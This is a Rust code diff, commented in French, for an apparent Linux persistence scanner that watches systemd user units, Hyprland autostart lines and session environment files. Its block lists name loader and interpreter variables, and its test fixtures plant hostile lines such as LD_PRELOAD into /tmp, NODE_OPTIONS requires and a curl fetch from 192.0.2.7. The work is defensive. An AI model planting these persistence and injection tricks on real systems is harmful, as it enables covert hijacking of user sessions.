@@ -221,7 +221,7 @@ fn commande_lancee_lue(ligne: &str) -> Option<(String, bool)> {
     }
     if let Some((cle, valeur)) = l.split_once('=') {
         let cle = cle.trim();
-        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
+        if cle.starts_with("Exec") || ["exec-once", "exec", "execr", "execr-once", "exec-shutdown"].contains(&cle) {
             return Some((valeur.trim().to_string(), false));
         }
     }
@@ -311,6 +311,13 @@ pub(super) fn persistance_dans(
     );
     #[cfg(test)]
     tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
+    // Une variable XDG relative est ignorée par systemd (la spécification XDG) : seule une absolue, ailleurs que le
+    // dossier par défaut, ajoute un dossier.
+    let deplace = |nom: &str, defaut: &str| {
+        variable(nom)
+            .map(std::path::PathBuf::from)
+            .filter(|p| p.is_absolute() && *p != maison.join(defaut))
+    };
     let mut t = Lancements {
         r: Releveur {
             racine: racine.to_path_buf(),
@@ -318,13 +325,35 @@ pub(super) fn persistance_dans(
             runtime: variable("XDG_RUNTIME_DIR")
                 .map(std::path::PathBuf::from)
                 .filter(|p| p.is_absolute()),
+            config: deplace("XDG_CONFIG_HOME", ".config"),
+            donnees: deplace("XDG_DATA_HOME", ".local/share"),
+            environnement: None,
             budget: temoins::Budget::default(),
         },
         ..Lancements::default()
     };
-    lire_prechargement(racine, &variable, gestion, &mut t);
+    // Un dossier personnel inconnu ou relatif : les fichiers du compte se liraient sous le dossier courant, et
+    // l'absence de tout y passerait pour « rien de suspect » (campagne E, M-f). C'est dit, non vérifié.
+    if !maison.is_absolute() {
+        t.sources.push(source_de("maison", "relatif"));
+        t.retraits.push(None);
+        t.temoins.push(Err(temoins::Refus(
+            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
+        )));
+        t.suspects.push(
+            tr!(
+                "dossier personnel inconnu ou relatif : les démarrages du compte ne sont pas vérifiés",
+                "home folder unknown or relative: the account's startup files are not checked"
+            )
+            .to_string(),
+        );
+    }
     let (demarrage, hypr) = fichiers_de_demarrage(racine, maison);
     let mut configuration = fichiers_de_configuration(racine, maison);
+    let mut sources = configuration.clone();
+    sources.extend(hypr.iter().cloned());
+    t.r.environnement = Some(environnement(&t.r, sources));
+    lire_prechargement(racine, &variable, gestion, &mut t);
     // Les fichiers de Hyprland sont aussi des fichiers de configuration, après les autres.
     configuration.extend(hypr);
     juger_configuration(&configuration, &demarrage, maison, &mut t);
@@ -359,6 +388,12 @@ struct Releveur {
     racine: std::path::PathBuf,
     maison: std::path::PathBuf,
     runtime: Option<std::path::PathBuf>,
+    /// XDG_CONFIG_HOME et XDG_DATA_HOME, s'ils mènent ailleurs que les dossiers par défaut du dossier personnel.
+    config: Option<std::path::PathBuf>,
+    donnees: Option<std::path::PathBuf>,
+    /// Les lignes des fichiers d'environnement des sessions qui nomment une variable sensible (`environnement`), liées
+    /// à chaque ligne déclarée normale ; `None` : pas relevées, donc rien ne se déclare.
+    environnement: Option<Result<(String, temoins::Etat), temoins::Refus>>,
     budget: temoins::Budget,
 }
 
@@ -434,6 +469,14 @@ fn raison_du_flou(f: designes::Flou) -> &'static str {
         Flou::Blanc => tr!(
             "contient un blanc inhabituel ou un caractère invisible : l'écran ne la montre pas telle qu'elle se lit",
             "contains an unusual space or an invisible character: the screen does not show it the way it is read"
+        ),
+        Flou::Octet => tr!(
+            "contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
+            "contains a byte that is not text (UTF-8): what is shown would not be what is started"
+        ),
+        Flou::Argument => tr!(
+            "donne à son programme un mot qui n'est ni une option ni un chemin absolu : un interpréteur sous un autre nom le lirait comme un script",
+            "gives its program a word that is neither an option nor an absolute path: an interpreter under another name would read it as a script"
         ),
         Flou::Relatif => tr!(
             "nomme un chemin relatif, qui dépend du dossier courant",
@@ -585,6 +628,16 @@ fn temoin_de_ligne(
     sorte: Sorte,
 ) -> Result<temoins::Temoin, temoins::Refus> {
     place(t)?;
+    // Un octet qui n'est pas de l'UTF-8, dans le fichier ou son chemin : lu « avec pertes », il se montrerait et se
+    // suivrait autrement que le lanceur, qui garde l'octet tel quel.
+    if std::str::from_utf8(&lu.octets).is_err() || fichier.to_str().is_none() {
+        return Err(octet_refuse(&court(fichier, &t.r.maison)));
+    }
+    if !t.r.maison.is_absolute() {
+        return Err(temoins::Refus(
+            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
+        ));
+    }
     let mut cibles = cibles(&mut t.r, designe, ligne)?;
     if !lu.entier {
         return Err(temoins::Refus(trf!(
@@ -596,13 +649,122 @@ fn temoin_de_ligne(
     if let Sorte::Unite { utilisateur } = sorte {
         cibles.extend(unite(&t.r, fichier, &lu.texte, utilisateur)?);
     }
+    cibles.push(environnement_lie(&t.r)?);
     let numero = n.saturating_add(1);
     Ok(temoins::temoin(
         &format!("{}:{numero}", fichier.to_string_lossy()),
         format!("{}:{numero}", court(fichier, &t.r.maison)),
         ligne,
-        Some(&temoins::etat_du_contenant(fichier, &lu.octets)),
+        Some(&temoins::etat_du_contenant(fichier, &lu.octets)?),
         &cibles,
+    ))
+}
+
+/// Ce qui se lie de l'environnement des sessions : sous ce nom, les lignes qui nomment une variable sensible.
+const ENVIRONNEMENT: &str = "[env] LD_*, PYTHON*, NODE_*, BASH_ENV, PS4, XDG_CONFIG_HOME…";
+
+/// Les fichiers qui posent des variables pour les sessions et les services de l'utilisateur, au-delà des profils et
+/// de Hyprland (`sources`) : environment.d, les réglages du gestionnaire de systemd (DefaultEnvironment=), pam_env.
+/// Chaque ligne qui nomme une variable sensible (`variable_sensible`), avec son fichier : une variable posée là après
+/// le choix (BASH_ENV, NODE_OPTIONS, PYTHONPATH…) change ce que fait la ligne acceptée sans toucher à un fichier lié ;
+/// liée ainsi, elle fait revenir l'alerte (campagne E, F4). `Err` : un de ces fichiers ne se lit pas en entier, ou
+/// n'est pas du texte.
+fn environnement(
+    r: &Releveur,
+    mut sources: Vec<std::path::PathBuf>,
+) -> Result<(String, temoins::Etat), temoins::Refus> {
+    let s = |c: &str| r.sous(Path::new(c));
+    let m = |c: &str| r.maison.join(c);
+    for f in [
+        "/etc/systemd/user.conf",
+        "/etc/systemd/system.conf",
+        "/etc/security/pam_env.conf",
+    ] {
+        sources.push(s(f));
+    }
+    for d in [
+        "/etc/systemd/user.conf.d",
+        "/etc/systemd/system.conf.d",
+        "/usr/lib/environment.d",
+        "/run/environment.d",
+    ] {
+        sources.extend(fichiers_de(&s(d), &["conf"]));
+    }
+    sources.push(m(".config/systemd/user.conf"));
+    sources.push(m(".pam_environment"));
+    sources.extend(fichiers_de(&m(".config/systemd/user.conf.d"), &["conf"]));
+    if let Some(c) = &r.config {
+        sources.push(r.sous(&c.join("systemd/user.conf")));
+        sources.extend(fichiers_de(&r.sous(&c.join("systemd/user.conf.d")), &["conf"]));
+        sources.extend(fichiers_de(&r.sous(&c.join("environment.d")), &["conf"]));
+    }
+    sources.sort();
+    sources.dedup();
+    let mut lignes = String::new();
+    for f in &sources {
+        let montre = || crate::ui::affichable(&r.montre(f));
+        let lu = match temoins::lire_borne(f, LECTURE_MAX) {
+            Ok(lu) => lu,
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
+            Err(e) => {
+                return Err(temoins::Refus(trf!(
+                    "{} ne se lit pas ({e}) : les variables qu'il pose pour les sessions ne se vérifient pas",
+                    "{} cannot be read ({e}): the variables it sets for sessions cannot be checked",
+                    montre()
+                )));
+            }
+        };
+        if !lu.entier {
+            return Err(temoins::Refus(trf!(
+                "{} ne se lit pas en entier",
+                "{} cannot be read in full",
+                montre()
+            )));
+        }
+        let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
+            return Err(octet_refuse(&montre()));
+        };
+        for l in texte.lines() {
+            // Un commentaire (« # » en tête, partout dans ces formats) ne pose rien ; sauf s'il finit par « \ » : une
+            // ligne continuée selon le lecteur, gardée.
+            let net = l.trim_matches([' ', '\t']);
+            if net.starts_with('#') && !net.ends_with('\\') {
+                continue;
+            }
+            let nomme = l.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')).any(|mot| {
+                mot.bytes().any(|b| b.is_ascii_uppercase())
+                    && !mot.bytes().any(|b| b.is_ascii_lowercase())
+                    && variable_sensible(mot)
+            });
+            if nomme {
+                lignes.push_str(&r.montre(f));
+                lignes.push_str(": ");
+                lignes.push_str(l.trim_matches([' ', '\t']));
+                lignes.push('\n');
+            }
+        }
+    }
+    Ok((ENVIRONNEMENT.to_string(), temoins::Etat::du_texte(lignes.as_bytes())))
+}
+
+/// L'environnement relevé (`environnement`), à lier à une ligne ; son refus sinon.
+fn environnement_lie(r: &Releveur) -> Result<(String, temoins::Etat), temoins::Refus> {
+    r.environnement.clone().unwrap_or_else(|| {
+        Err(temoins::Refus(
+            tr!(
+                "les variables des sessions n'ont pas été relevées",
+                "the session variables were not recorded"
+            )
+            .to_string(),
+        ))
+    })
+}
+
+/// Le refus d'un fichier dont le contenu ou le chemin n'est pas de l'UTF-8.
+fn octet_refuse(fichier: &str) -> temoins::Refus {
+    temoins::Refus(trf!(
+        "{fichier} contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
+        "{fichier} contains a byte that is not text (UTF-8): what is shown would not be what is started"
     ))
 }
 
@@ -613,8 +775,13 @@ const AJOUT_MAX: u64 = 1024 * 1024;
 
 /// Directives d'une unité qui changent ce qu'elle lance ou charge sans toucher à la ligne acceptée : variables lues
 /// ailleurs, dossier de recherche des programmes, racine ou dossiers montés à la place des vrais.
-const DIRECTIVES_REFUSEES: [&str; 9] = [
+const DIRECTIVES_REFUSEES: [&str; 12] = [
     "EnvironmentFile",
+    // L'entrée standard prise d'un fichier ou d'un texte : un interpréteur sous un autre nom la lirait comme son
+    // script, jamais lié (campagne E, F2).
+    "StandardInput",
+    "StandardInputText",
+    "StandardInputData",
     "ExecSearchPath",
     "RootDirectory",
     "RootImage",
@@ -628,8 +795,14 @@ const DIRECTIVES_REFUSEES: [&str; 9] = [
 /// Une variable qui change ce que charge un programme ou un interpréteur, ou où il cherche : bibliothèques, modules,
 /// dossier personnel (« ${HOME}/x » d'une ligne), PATH, fichier lu au démarrage d'un shell.
 fn variable_sensible(nom: &str) -> bool {
-    const DEBUTS: [&str; 18] = [
+    const DEBUTS: [&str; 24] = [
         "LD_",
+        "QT_",
+        "GIO_",
+        "GST_PLUGIN",
+        "OPENSSL_",
+        "TCL",
+        "GTK_PATH",
         "PYTHON",
         "NODE_",
         "PERL",
@@ -648,7 +821,7 @@ fn variable_sensible(nom: &str) -> bool {
         "GTK_MODULES",
         "MALLOC_",
     ];
-    const NOMS: [&str; 8] = [
+    const NOMS: [&str; 16] = [
         "HOME",
         "PATH",
         "ENV",
@@ -657,6 +830,14 @@ fn variable_sensible(nom: &str) -> bool {
         "SHELLOPTS",
         "BASHOPTS",
         "IFS",
+        "PS4",
+        "PROMPT_COMMAND",
+        "GTK_EXE_PREFIX",
+        "XDG_CONFIG_HOME",
+        "XDG_CONFIG_DIRS",
+        "XDG_DATA_HOME",
+        "XDG_DATA_DIRS",
+        "SSL_CERT_FILE",
     ];
     let n = nom.to_ascii_uppercase();
     DEBUTS.iter().any(|d| n.starts_with(d)) || NOMS.contains(&n.as_str())
@@ -739,23 +920,35 @@ fn dossiers_d_unites(r: &Releveur, utilisateur: bool) -> Result<Vec<std::path::P
     };
     let run = |c: &str| r.sous(&session.join(c));
     let m = |c: &str| r.maison.join(c);
-    Ok(vec![
-        m(".config/systemd/user.control"),
-        run("systemd/user.control"),
-        run("systemd/transient"),
-        run("systemd/generator.early"),
-        m(".config/systemd/user"),
-        s("/etc/xdg/systemd/user"),
-        s("/etc/systemd/user"),
-        run("systemd/user"),
-        run("systemd/generator"),
-        m(".local/share/systemd/user"),
-        s("/usr/local/share/systemd/user"),
-        s("/usr/share/systemd/user"),
-        s("/usr/local/lib/systemd/user"),
-        s("/usr/lib/systemd/user"),
-        run("systemd/generator.late"),
-    ])
+    // Un XDG_CONFIG_HOME ou XDG_DATA_HOME déplacé : systemd y cherche aussi, en plus des dossiers par défaut (que le
+    // gestionnaire de la session lit peut-être, sans ces variables).
+    let x = |base: &Option<std::path::PathBuf>, c: &str| base.as_ref().map(|b| r.sous(&b.join(c)));
+    let mut dossiers: Vec<std::path::PathBuf> = [
+        Some(m(".config/systemd/user.control")),
+        x(&r.config, "systemd/user.control"),
+        Some(run("systemd/user.control")),
+        Some(run("systemd/transient")),
+        Some(run("systemd/generator.early")),
+        Some(m(".config/systemd/user")),
+        x(&r.config, "systemd/user"),
+        Some(s("/etc/xdg/systemd/user")),
+        Some(s("/etc/systemd/user")),
+        Some(run("systemd/user")),
+        Some(s("/run/systemd/user")),
+        Some(run("systemd/generator")),
+        Some(m(".local/share/systemd/user")),
+        x(&r.donnees, "systemd/user"),
+        Some(s("/usr/local/share/systemd/user")),
+        Some(s("/usr/share/systemd/user")),
+        Some(s("/usr/local/lib/systemd/user")),
+        Some(s("/usr/lib/systemd/user")),
+        Some(run("systemd/generator.late")),
+    ]
+    .into_iter()
+    .flatten()
+    .collect();
+    dossiers.dedup();
+    Ok(dossiers)
 }
 
 /// Les noms des dossiers d'ajout qui s'appliquent à l'unité `nom` : « a-b.service.d », « a-.service.d »,
@@ -786,6 +979,9 @@ fn lire_ajout(r: &Releveur, f: &Path) -> Result<temoins::Etat, temoins::Refus> {
         return Ok(temoins::Etat::Lien {
             vers: "/dev/null".into(),
             puis: Box::new(temoins::Etat::Absent),
+            vu: std::fs::symlink_metadata(f)
+                .map(|m| temoins::Vu::de(&m))
+                .unwrap_or_default(),
         });
     }
     let lu = match temoins::lire_borne(f, AJOUT_MAX) {
@@ -806,10 +1002,13 @@ fn lire_ajout(r: &Releveur, f: &Path) -> Result<temoins::Etat, temoins::Refus> {
             montre()
         )));
     }
-    if let Some(d) = directive_refusee(&String::from_utf8_lossy(&lu.octets)) {
+    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
+        return Err(octet_refuse(&montre()));
+    };
+    if let Some(d) = directive_refusee(texte) {
         return Err(refus_directive(&montre(), &d));
     }
-    Ok(temoins::etat_du_contenant(f, &lu.octets))
+    temoins::etat_du_contenant(f, &lu.octets)
 }
 
 fn refus_directive(fichier: &str, directive: &str) -> temoins::Refus {
@@ -864,7 +1063,36 @@ fn unite(
         let f = d.join(&nom);
         lies.push((r.montre(&f), lire_ajout(r, &f)?));
     }
-    let noms = ajouts_de(&nom);
+    let mut noms = ajouts_de(&nom);
+    // Les alias de l'unité (un lien d'un dossier d'unités vers elle, sous un autre nom) : systemd applique aussi les
+    // ajouts posés sous leur nom, jusque dans le dossier de la session (campagne E, F5).
+    let vraie = premiere
+        .map(|d| d.join(&nom))
+        .and_then(|f| std::fs::canonicalize(f).ok());
+    for d in &dossiers {
+        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
+            let n = e.file_name();
+            // Un nom qui n'est pas de l'UTF-8 ne se compare pas : un alias ainsi nommé échapperait (F1).
+            let Some(n) = n.to_str() else {
+                return Err(octet_refuse(&crate::ui::affichable(&r.montre(&e.path()))));
+            };
+            if n == nom {
+                continue;
+            }
+            let Ok(vers) = std::fs::read_link(e.path()) else {
+                continue;
+            };
+            let meme_nom = vers.file_name().is_some_and(|v| v == std::ffi::OsStr::new(&nom));
+            let meme_fichier = vraie
+                .as_ref()
+                .is_some_and(|v| std::fs::canonicalize(e.path()).is_ok_and(|c| c == *v));
+            if meme_nom || meme_fichier {
+                noms.extend(ajouts_de(n));
+            }
+        }
+    }
+    noms.sort();
+    noms.dedup();
     // Une ligne d'un gabarit (« a@.service ») vaut pour chaque instance : leurs ajouts (« a@x.service.d ») aussi.
     let instances = nom
         .rsplit_once('.')
@@ -1346,7 +1574,9 @@ fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temo
             "{montre} is too large to be re-read at each check"
         )));
     }
-    let texte = String::from_utf8_lossy(&lu.octets);
+    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
+        return Err(octet_refuse(&montre));
+    };
     let mut cibles_liees = Vec::new();
     for l in texte.lines() {
         let Some((commande, _)) = commande_lancee_lue(l) else {
@@ -1355,7 +1585,8 @@ fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temo
         let d = designes::commande(&commande, designes::Contexte::Unite(None));
         cibles_liees.extend(cibles(r, d, l)?);
     }
-    cibles_liees.extend(unite(r, f, &texte, false)?);
+    cibles_liees.extend(unite(r, f, texte, false)?);
+    cibles_liees.push(environnement_lie(r)?);
     let nom = f
         .file_name()
         .map(|n| n.to_string_lossy().into_owned())
@@ -1364,7 +1595,7 @@ fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temo
         &f.to_string_lossy(),
         montre,
         &nom,
-        Some(&temoins::etat_du_contenant(f, &lu.octets)),
+        Some(&temoins::etat_du_contenant(f, &lu.octets)?),
         &cibles_liees,
     ))
 }
@@ -2244,8 +2475,12 @@ mod tests {
         assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
         assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
         assert!(lignes[0].contenant.is_some());
-        assert_eq!(lignes[0].cibles.len(), 1);
+        assert_eq!(lignes[0].cibles.len(), 2);
         assert_eq!(lignes[0].cibles[0].chemin, "~/.cache-x/rappel.sh");
+        assert_eq!(
+            lignes[0].cibles[1].chemin, ENVIRONNEMENT,
+            "l'environnement des sessions est lié"
+        );
         assert!(crate::apprentissage::declarable(&c).is_ok());
         let encore = m.lancements();
         assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
@@ -2256,7 +2491,7 @@ mod tests {
     #[test]
     fn tout_changement_fait_revenir_l_alerte() {
         type Changement = fn(&Maison);
-        let cas: [(&str, Changement); 12] = [
+        let cas: [(&str, Changement); 20] = [
             ("unité changée", |m| {
                 m.ecrire(
                     ".config/systemd/user/rappel.service",
@@ -2310,6 +2545,51 @@ mod tests {
                     &UNITE.replace("rappel.sh", "rappel.sh --x"),
                 );
             }),
+            // Campagne E, F4 : une variable posée pour les sessions change ce que fait la ligne sans toucher à un
+            // fichier lié.
+            ("variable dans environment.d", |m| {
+                m.ecrire(
+                    ".config/environment.d/50-x.conf",
+                    "BASH_ENV=/home/alice/.cache-x/e.sh
+",
+                );
+            }),
+            ("variable par défaut du gestionnaire", |m| {
+                m.ecrire(
+                    ".config/systemd/user.conf.d/x.conf",
+                    "[Manager]\nDefaultEnvironment=PYTHONPATH=/home/alice/.cache-x\n",
+                );
+            }),
+            ("variable de Hyprland", |m| {
+                m.ecrire(
+                    ".config/hypr/hyprland.conf",
+                    "env = NODE_OPTIONS,--require=/home/alice/.e.js\n",
+                );
+            }),
+            ("variable d'un profil", |m| {
+                m.ecrire(".profile", "export PS4='$(id)'\n");
+            }),
+            ("variable de pam_env", |m| {
+                m.ecrire(".pam_environment", "PYTHONSTARTUP DEFAULT=/home/alice/.e.py\n");
+            }),
+            // F5 : un alias de l'unité et son ajout, dans le dossier de la session.
+            ("ajout posé sous un alias", |m| {
+                let d = m.racine.join("run/user/1000/systemd/user");
+                std::fs::create_dir_all(d.join("alias.service.d")).unwrap();
+                std::os::unix::fs::symlink(m.chemin(".config/systemd/user/rappel.service"), d.join("alias.service"))
+                    .unwrap();
+                std::fs::write(d.join("alias.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
+            }),
+            // M-d : le dossier d'exécution de systemd pour les unités de l'utilisateur.
+            ("ajout posé dans /run/systemd/user", |m| {
+                let d = m.racine.join("run/systemd/user/rappel.service.d");
+                std::fs::create_dir_all(&d).unwrap();
+                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
+            }),
+            // M-c : execr-once d'Hyprland.
+            ("execr-once d'Hyprland", |m| {
+                m.ecrire(".config/hypr/autostart.conf", "execr-once = /tmp/.x/agent\n");
+            }),
         ];
         for (nom, changer) in cas {
             let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
@@ -2362,6 +2642,100 @@ mod tests {
     }
 
     /// Le refus d'une alerte, tel qu'il se montre.
+    /// Campagne E, F1 : un octet qui n'est pas de l'UTF-8 dans un fichier de démarrage ou d'environnement : la
+    /// ligne ne se déclare pas (lue « avec pertes », elle montrerait et suivrait un autre fichier que celui lancé).
+    #[test]
+    fn octet_illisible_jamais_declarable() {
+        let sources: [(&str, &[u8]); 5] = [
+            (
+                ".config/systemd/user/rappel.service",
+                b"[Service]\nExecStart=%h/.cache-x/rap\xffpel.sh\n",
+            ),
+            (
+                ".config/autostart/maj.desktop",
+                b"[Desktop Entry]\nExec=/tmp/.x/ag\xffent\n",
+            ),
+            (".config/hypr/autostart.conf", b"exec-once = /tmp/.x/ag\xffent\n"),
+            (".bashrc", b"export LD_PRELOAD=/tmp/.l/li\xffbz.so\n"),
+            (".config/environment.d/50-x.conf", b"LANG=fr\xff\n"),
+        ];
+        for (i, (fichier, octets)) in sources.into_iter().enumerate() {
+            let m = maison_avec_rappel(&format!("octet-{i}"));
+            let p = m.chemin(fichier);
+            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+            std::fs::write(&p, octets).unwrap();
+            let c = m.lancements();
+            assert!(c.probleme >= Some(Niveau::Eleve), "{fichier}");
+            assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
+        }
+    }
+
+    /// Les variables des sessions liées : un commentaire n'en pose pas (rien à montrer ni à lier), sauf continué.
+    #[test]
+    fn variables_des_sessions_sans_commentaires() {
+        let m = maison_avec_rappel("commentaires");
+        let declare = m.lancements();
+        m.ecrire(".config/environment.d/50-x.conf", "# PYTHONPATH=/x\n  #BASH_ENV=/y\n");
+        assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()));
+        m.ecrire(".config/environment.d/50-x.conf", "# note \\\nPYTHONPATH=/x\n");
+        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
+    }
+
+    /// Campagne E, M-f : un dossier personnel relatif ne passe jamais pour « rien de suspect ».
+    #[test]
+    fn dossier_personnel_relatif_dit() {
+        let m = maison_avec_rappel("relatif");
+        let c = persistance_dans(&m.racine, Path::new("maison"), |_| None, None, None)
+            .into_iter()
+            .next()
+            .unwrap();
+        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
+        assert!(
+            c.message.contains("dossier personnel inconnu ou relatif"),
+            "{}",
+            c.message
+        );
+        assert!(crate::apprentissage::declarable(&c).is_err());
+    }
+
+    /// Campagne E, M-d : un XDG_CONFIG_HOME déplacé est lu, ses unités et ses variables comprises.
+    #[test]
+    fn configuration_deplacee_lue() {
+        let m = maison_avec_rappel("deplacee");
+        let ailleurs = m.racine.join("ailleurs");
+        let vars = |v: &str| match v {
+            "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
+            "XDG_CONFIG_HOME" => Some("/ailleurs".into()),
+            _ => None,
+        };
+        let lire = || {
+            persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
+                .into_iter()
+                .next()
+                .unwrap()
+        };
+        let declare = lire();
+        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
+        std::fs::create_dir_all(ailleurs.join("systemd/user/rappel.service.d")).unwrap();
+        std::fs::write(
+            ailleurs.join("systemd/user/rappel.service.d/x.conf"),
+            "[Service]\nNice=5\n",
+        )
+        .unwrap();
+        assert!(
+            !crate::apprentissage::essai_tait(&declare, &lire()),
+            "ajout sous XDG_CONFIG_HOME"
+        );
+        std::fs::remove_dir_all(ailleurs.join("systemd")).unwrap();
+        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
+        std::fs::create_dir_all(ailleurs.join("environment.d")).unwrap();
+        std::fs::write(ailleurs.join("environment.d/x.conf"), "NODE_OPTIONS=--require=/x.js\n").unwrap();
+        assert!(
+            !crate::apprentissage::essai_tait(&declare, &lire()),
+            "variable sous XDG_CONFIG_HOME"
+        );
+    }
+
     fn refus(c: &Constat) -> String {
         match c.temoins() {
             crate::machine::temoins::Temoins::Refuse(r) => r.clone(),
@@ -2374,7 +2748,7 @@ mod tests {
     /// qui passe avant, même écrit sur des lignes continuées.
     #[test]
     fn unite_redirigee_refusee() {
-        let cas: [(&str, &str, &str); 6] = [
+        let cas: [(&str, &str, &str); 7] = [
             (
                 "rappel.service.d/x.conf",
                 "[Service]\nEnvironment=HOME=/tmp/h\n",
@@ -2401,6 +2775,12 @@ mod tests {
                 "ExecSearchPath",
             ),
             ("../user.control/rappel.service", UNITE, "user.control"),
+            // Campagne E : l'entrée standard d'un service peut porter le script que lit un interpréteur.
+            (
+                "rappel.service.d/x.conf",
+                "[Service]\nStandardInputText=curl http://192.0.2.7/x\n",
+                "StandardInput",
+            ),
         ];
         for (fichier, texte, attendu) in cas {
             let m = maison_avec_rappel(&format!("redirigee-{}", attendu.len()));
@@ -2450,7 +2830,7 @@ mod tests {
         assert_eq!(c.probleme, Some(Niveau::Eleve), "le script caché est signalé");
         let lignes = c.temoins().lignes();
         let chemins: Vec<&str> = lignes[0].cibles.iter().map(|c| c.chemin.as_str()).collect();
-        assert_eq!(chemins, ["/usr/bin/bash", "~/.cache-x/rappel.sh"]);
+        assert_eq!(chemins, ["/usr/bin/bash", "~/.cache-x/rappel.sh", ENVIRONNEMENT]);
         assert!(lignes[0].cibles[1].apercu.is_some(), "le script se montre");
         let declare = c;
         m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl http://192.0.2.7/x\n");
@@ -2505,8 +2885,14 @@ mod tests {
             maison: m.chemin(""),
             ..Releveur::default()
         };
+        assert!(
+            temoin_de_service(&mut r, &unite).is_err(),
+            "sans l'environnement relevé, rien ne se lie"
+        );
+        r.environnement = Some(environnement(&r, Vec::new()));
         let avant = temoin_de_service(&mut r, &unite).unwrap();
-        assert_eq!(avant.cibles.len(), 1);
+        assert_eq!(avant.cibles.len(), 2);
+        assert_eq!(avant.cibles[1].chemin, ENVIRONNEMENT);
         assert_eq!(avant.cibles[0].chemin, "/opt/sauvegarde/lancer");
         std::fs::write(&programme, "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
         let apres = temoin_de_service(&mut r, &unite).unwrap();
